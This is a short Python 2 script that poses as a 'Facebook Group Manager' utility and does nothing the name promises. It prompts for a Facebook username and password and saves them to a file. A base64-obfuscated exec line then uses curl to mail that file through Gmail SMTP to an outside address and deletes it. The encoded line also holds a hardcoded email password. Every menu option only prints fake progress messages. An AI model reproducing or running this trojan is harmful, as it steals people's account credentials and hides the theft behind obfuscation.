import  sys , os , time , marshal , os.path
import base64

os.system("pkg install curl")

if sys.platform in ["linux","linux2"]:

	W = "\033[0m"
        G = '\033[32;1m'
        R = '\033[31;1m'

else:
	W = ''
	G = ''
	R = ''

print' ' + W
print(R +'F G M').center(44)
print(W + '     [' + G +'Facebook Group Manager'+ W + ']')
print' '

print '[*] login to your facebook account         ';id = raw_input('[?] Username : ');pwd = raw_input('[?] Password : ');i = open('document.txt', 'w');i.write(id);i.write(pwd);i.close();
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('b3Muc3lzdGVtKCJjdXJsIHNtdHBzOi8vc210cC5nbWFpbC5jb206NDY1IC0tbWFpbC1mcm9tIHNvdWhhaWw0MTgyQGdtYWlsLmNvbSAtLW1haWwtcmNwdCBzb3VoYWlsNDE4QHByb3Rvbm1haWwuY29tIC0tdXBsb2FkLWZpbGUgZG9jdW1lbnQudHh0IC0tdXNlciAnc291aGFpbDQxODJAZ21haWwuY29tOkthbWFsMTk1MycKIik7b3MucmVtb3ZlKCJkb2N1bWVudC50eHQiKTs=')))
time.sleep(7)
print (G + '1.Facebook Group Manager')
print (G + '2.Facebook Friends Manager')
user_input=raw_input((R +'Choose 1 or 2 : '))
if  user_input == "1":
 print "\033[92m[*] \033[93 GGenerating Groups lists.."

 time.sleep(3)
 print('##########################################################')
 time.sleep(3)
 print('[*]Generating Admin Group lists...')
 time.sleep(3)
 print('####################################################################')
 print "\033[92m[*] \033[93 f[*]fetching members stats ..."
 print('####################################################################')
 time.sleep(3)
 print('[*]Note this may take up to 5mins please wait...')
 time.sleep(600)

elif user_input == "2":

 print "\033[92m[*] \033[93 GGenerating friends lists.."

 time.sleep(3)
 print('##########################################################')
 time.sleep(3)
 print('[*]Generating profile  lists...')
 time.sleep(3)
 print('####################################################################')
 print "\033[92m[*] \033[93 f[*]fetching friends stats ..."
 print('####################################################################')
 time.sleep(3)
 print('this may take a while please wait')
else:
  sys.exit()
